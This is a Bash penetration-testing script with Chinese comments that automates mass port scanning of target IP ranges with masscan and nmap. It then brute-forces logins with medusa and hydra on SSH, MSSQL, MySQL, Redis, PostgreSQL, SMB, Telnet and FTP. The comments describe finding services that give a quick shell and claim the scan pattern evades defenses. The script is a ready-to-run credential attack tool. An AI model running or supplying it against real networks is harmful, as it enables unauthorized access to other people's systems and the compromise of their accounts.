...
# 
# Author klion
# Use:  nohup ./scan.sh 要探测的所有服务端口列表文件 目标的所有真实ip/段[C段]列表文件 保存扫描结果的目录名[随意] 用户名字典文件 密码字典文件 &
#       nohup ./scan.sh TargetPorts.txt TargetIplist.txt result user.txt pwd.txt &
#       tail -f nohup.out
# 
########################################
# 脚本初衷,尽量简化我们日常渗透中的一些例行的重复性动作,利用bash就地取材,快速实现一个极为廉价的外部搜集工具,大致流程如下 
# Masscan + Nmap[script] + Medusa+ Hydra [ 由于是同时针对多个ip段扫一个端口,而非针对一个ip同时扫一堆端口,加之用的只是常规循环(单线程),理论上防护规避效果应该稍好 ]
# 先利用masscan 集中对目标的所有C段进行快速端口探测,而后再对开放相应端口的ip进行二次的精度端口服务识别
# 之后再针对一些可快速getshell的基础服务,进行初期弱口令尝试
# 所有 扫描 和 爆破 的结果均已按照其所对应的 "端口" 和 "服务名" 分类保存在当前目录中的result目录下
# 分类存主要也是为了方便弟兄们后续好再针对目标开放某个端口的ip列表进行集中操作
# 为在保证精度的情况下尽量加快速度,经过多次实测,中间省去了很多判断和校验,有些输出信息之所以没直接丢到null里,主要是为了让弟兄们能更清晰的看到整个过程
...
if [ $# -eq 0 ];then
    ...
    echo -e "\e[91m          # nohup ./scan.sh 要探测的所有服务端口列表文件 目标的所有真实ip/段[C段]列表文件 保存扫描结果的目录名[随意] 用户名字典文件 密码字典文件 &\e[0m"
    echo -e "\e[91m          # nohup ./scan.sh TargetPorts.txt TargetIplist.txt result user.txt pwd.txt &\e[0m\n"
...
do
    ...
    if [ $port -ge 80 -a  $port -le 90 ] || [ $port -ge 8080 -a $port -le 8090 ] || [ $port -eq 443 ] || [ $port -eq 8443 ];then
        ...
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open --script=http-headers.nse,http-title.nse,http-robots.txt.nse,http-iis-webdav-vuln.nse -oN $3/Web_${port}_scan_res.txt
        # 可选常规web检测脚本
    ...
    if [ $port -ge 9200 -a $port -le 9300 ] || [ $port -ge 7001 -a $port -le 7010 ] || [ $port -eq 9999 ];then
        ...
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/JavaWeb_${port}_scan_res.txt
    ...
    if [ $port -eq 22 ];then
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/SSH_scan_res.txt
        echo "Ssh Login Begining ....."
        medusa -H ${port}.txt -u root -e ns -P $5 -t 3 -T 16 -f -M ssh -R 3 -r 5 -O $3/SSH_Login_succeed.txt
    ...
    if [ $port -eq 3389 ];then
        echo "Rdp Scaning ....."
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/RDP_scan_res.txt
        # 可选检测脚本 rdp-vuln-ms12-020.nse
    fi

    # Mssql Login
    if [ $port -eq 1433 ];then
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open --script=ms-sql-empty-password.nse -oN $3/Mssql_scan_res.txt
        echo "Mssql Login Begining ....."
        medusa -H ${port}.txt -u sa -e ns -P $5 -t 3 -T 16 -f -M mssql -R 3 -r 5 -O $3/Mssql_Login_succeed.txt
        echo "Mssql Login Ending ....."
    fi

    # MySQL Login
    if [ $port -eq 3306 ];then
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open --script=mysql-empty-password.nse -oN $3/MySQL_scan_res.txt
        echo "MySQL Login Begining ....."
        medusa -H ${port}.txt -u root -e ns -P $5 -t 3 -T 16 -f -M mysql -R 3 -r 5 -O $3/MySQL_Login_succeed.txt
        echo "MySQL Login Ending ....."
    fi

    # Redis Login
    if [ $port -eq 6379 ];then
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open --script=redis-info.nse -oN $3/Redis_scan_res.txt
        echo "Redis Login Begining ....."
        hydra -P $5 -e ns -f -o $3/Redis_Login_succeed.txt -M ${port}.txt -t 3 -T 16 -w 20 -V redis
        echo "Redis Login Ending ....."
    fi

    # Postgresql Login
    if [ $port -eq 5432 ];then
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Postgresql_scan_res.txt
        echo "Postgresql Login Begining ....."
        medusa -H ${port}.txt -u postgres -e ns -P $5 -t 3 -T 16 -f -M postgres -R 3 -r 5 -O $3/PgSQL_Login_succeed.txt
        echo "Postgresql Login Ending ....."
    fi

    # SMB Login
    if [ $port -eq 445 ];then
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Smb_scan_res.txt
        echo "Smb Login Begining ....."
        hydra -l administrator -P $5 -e ns -f -o $3/Smb_Login_succeed.txt -M ${port}.txt -t 5 -T 16 -w 20 -V smb
    ...
    # Telnet Login
    if [ $port -eq 23 ];then
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Telnet_scan_res.txt
        echo "Telnet Login Begining ....."
        medusa -H ${port}.txt -U $4 -e ns -P $5 -t 3 -T 16 -f -M telnet -R 3 -r 5 -O $3/Telnet_Login_succeed.txt
    ...
    if [ $port -eq 389 ];then
        echo "Ldap Scaning ....."
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Ldap_scan_res.txt
    fi
    ...
    if [ $port -eq 1521 ];then
        ...
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Oracle_scan_res.txt
    fi
    ...
    if [ $port -eq 27017 ];then
        ...
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/MongoDB_scan_res.txt
    fi

    # FTP
    if [ $port -eq 21 ];then
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open --script=ftp-anon.nse -oN $3/Ftp_scan_res.txt
        echo "Ftp Login Begining ....."
        medusa -H ${port}.txt -U $4 -e ns -P $5 -t 2 -T 16 -M ftp -R 3 -r 5 -O $3/Ftp_Login_succeed.txt
    ...
    if [ $port -eq 873 ];then
        ...
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open --script=rsync-list-modules.nse -oN $3/Rsync_scan_res.txt
    fi

    # NFS
    if [ $port -eq 2049 ]  || [ $port -eq 111 ];then
        echo "NFS Gather info ......"
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open --script=nfs-showmount.nse -oN $3/NFS_scan_res.txt
    fi

    # POP3
    if [ $port -eq 110 ] || [ $port -eq 995 ];then
        echo "POP3 Gather info......"
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Pop3_scan_res.txt
    fi

    # IMAP
    if [ $port -eq 143 ] || [ $port -eq 993 ];then
        echo "Imap Gather Info ......"
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Imap_scan_res.txt
    fi

    # SMTP
    if [ $port -eq 25 ]  || [ $port -eq 465 ] || [ $port -eq 587 ];then
        echo "Smtp Gather info ......"
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Smtp_scan_res.txt
    ...
    if [ $port -eq 5900 ];then
        ...
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Vnc_scan_res.txt
    fi

    # DNS
    if [ $port -eq 53 ];then
        echo "DNS Gather info ......"
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/DNS_scan_res.txt
    fi

    # CouchDB
    if [ $port -eq 5984 ];then
        echo "CouchDB Gather info ......"
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/CouchDB_scan_res.txt
    fi

    # FortiOS SSL VPN  Vuln
    if [ $port -eq 10443 ];then
        echo "FortiOS SSL VPN  Vuln Scaning ......"
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/FortiVpn_scan_res.txt
    ...
    if [ $port -eq 500 ];then
        ...
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Ike_version_scan_res.txt
    ...
    if [ $port -eq 1080 ];then
        ...
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/SOCKS_scan_res.txt
    fi

    # Nessus
    if [ $port -eq 1241 ];then
        echo "Nessus Gather info ......"
        nmap -p $port -iL ${port}.txt -Pn -sT -sV -n -vv --open -oN $3/Nessus_scan_res.txt
    fi
